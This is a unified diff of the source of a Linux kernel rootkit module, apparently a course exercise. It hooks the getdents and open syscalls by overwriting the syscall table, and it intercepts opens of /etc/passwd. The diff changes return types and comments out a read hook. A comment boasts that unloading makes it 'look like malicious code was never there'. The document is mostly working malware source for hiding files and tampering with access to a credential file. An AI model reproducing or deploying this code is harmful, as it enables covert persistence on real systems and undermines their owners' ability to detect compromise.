@@ -51,8 +51,8 @@ static unsigned long *sys_call_table = (unsigned long *)0xffffffff81a00200;
 //should expect ti find its arguments on the stack (not in registers).
 //This is used for all system calls.
 asmlinkage long (*original_getdents)(unsigned int fd, struct linux_dirent __user *dirp, unsigned int count);
-asmlinkage int (*original_open)(const char *filename, int flags, int mode);
-asmlinkage ssize_t (*original_read)(int fd, void *buf, size_t count);
+asmlinkage long (*original_open)(const char *filename, int flags, int mode);
+//asmlinkage ssize_t (*original_read)(int fd, void *buf, size_t count);
 
 //Define our new sneaky version of the 'getdents' syscall
 asmlinkage long sneaky_sys_getdents(unsigned int fd, struct linux_dirent __user *dirp, unsigned int count)
@@ -85,7 +85,7 @@ asmlinkage long sneaky_sys_getdents(unsigned int fd, struct linux_dirent __user 
   return value;
 }
 
-asmlinkage int sneaky_sys_open(const char *filename, int flags, int mode) {
+asmlinkage long sneaky_sys_open(const char *filename, int flags, int mode) {
   
   if (strcmp(filename, etc_passwd) == 0 )
   {
@@ -94,12 +94,12 @@ asmlinkage int sneaky_sys_open(const char *filename, int flags, int mode) {
     return (*original_open)(filename, flags, mode);
   }
 }
-
+/*
 asmlinkage ssize_t sneaky_sys_read(int fd, void *buf, size_t count) {
   ssize_t value = (*original_read)(fd, buf, count);
   return value;
   
-}
+}*/
 
 //The code that gets executed when the module is loaded
 static int initialize_sneaky_module(void)
@@ -124,8 +124,8 @@ static int initialize_sneaky_module(void)
   *(sys_call_table + __NR_getdents) = (unsigned long)sneaky_sys_getdents;
   original_open = (void*)*(sys_call_table + __NR_open);
   *(sys_call_table + __NR_open) = (unsigned long)sneaky_sys_open;
-  original_read = (void*)*(sys_call_table + __NR_read);
-  *(sys_call_table + __NR_read) = (unsigned long)sneaky_sys_read;
+  //original_read = (void*)*(sys_call_table + __NR_read);
+  //*(sys_call_table + __NR_read) = (unsigned long)sneaky_sys_read;
 
   //Revert page to read-only
   pages_ro(page_ptr, 1);
@@ -156,7 +156,7 @@ static void exit_sneaky_module(void)
   //function address. Will look like malicious code was never there!
   *(sys_call_table + __NR_getdents) = (unsigned long)original_getdents;
   *(sys_call_table + __NR_open) = (unsigned long)original_open;
-  *(sys_call_table + __NR_read) = (unsigned long)original_read;
+  //*(sys_call_table + __NR_read) = (unsigned long)original_read;
 
   //Revert page to read-only
   pages_ro(page_ptr, 1);
